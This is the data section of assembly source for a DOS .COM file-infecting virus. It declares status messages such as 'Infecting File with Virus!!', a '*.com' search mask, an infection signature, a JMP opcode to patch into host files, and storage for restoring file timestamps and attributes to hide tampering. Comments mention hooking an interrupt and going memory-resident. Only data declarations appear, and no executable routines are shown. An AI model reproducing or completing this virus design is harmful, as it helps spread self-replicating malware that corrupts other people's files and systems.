;----------------------------------------------------------------------------
; Data Area
;----------------------------------------------------------------------------
nISRNumber EQU 08h
nVirusID EQU 4B12h ;has to be 4Bxxh where the range are xx=03 to FF
Sstart db "Start the virus code ",0
sFileOpen db "Opening File for Read/Write...",0
sDateTime db "save form file the date and time...",0
sFileattributes db "save form file the attributes...",0
sFileCheck db "Reading Signature from File...",0
sFileSignature db "Checking Signature...",0
sPointerMoved db "File Pointer Move OK...", 0
sComFile db " File is a .COM File......Infecting File with Virus!!",0
sFileInfected db "File has been infected...",0
sClosingFile db "Closing File...",0
sJumpUpdated db "Jump Instruction Added...", 0
srestoreDateTime db "restore the last file date and time..",0
srestoreAttributes db "restore file Attributes..",0
sclearfileAttributes db "clear all file Attributes...",0
sAlreadyInfected db "File is already infected...",0
hookdone db "The ISR is hook the virus are TSR",0
newisr db "Install New ISR..",0
finish db "finish !!!",0
newDTA db "create new DTA..",0
MASKE_COM    db  "*.com",0; File search mask
firstfile dw 0h; is it the first file to infucted ??
DTA      db 128 dup(?) ;buffer to store the DTA   
nop
counter dw 0000H;counter value store here count the int 8
nop
_DX_DS dw 2 dup (?) ;DS:DX is stored here, first DX, then DS
wHostFileHandle dw ? ;handle of the host file
wHostTime dw ? ; here save the file time last change
wHostDate dw ?; here save the file date last change
wHostAttributes dw ? ;here save the file Attributes
;------------------------- DON'T SEPERATE -------------------------
HostBytesNew db 0E9h ;opcode for a JMP instruction --> Jump near, relative, displacement relative to next instruction.
wHostFileLength db 00,00 ;length of the host file (minus 3)
VirusSignature db "?'",0 ;signature of the virus need to be 6F73 in bytes 4 and 5 in host file .
;------------------------- DON'T SEPERATE -------------------------
HostBytesOld db 3 dup(?);first three bytes of host file.
HostSignature db 2 dup (?),0 ;the virus signature is stored in bytes
;4 and 5 of the host file. If the file is infected, these bytes
;will be equal to VirusSignature defined below
;-------------------------------------------------------------------
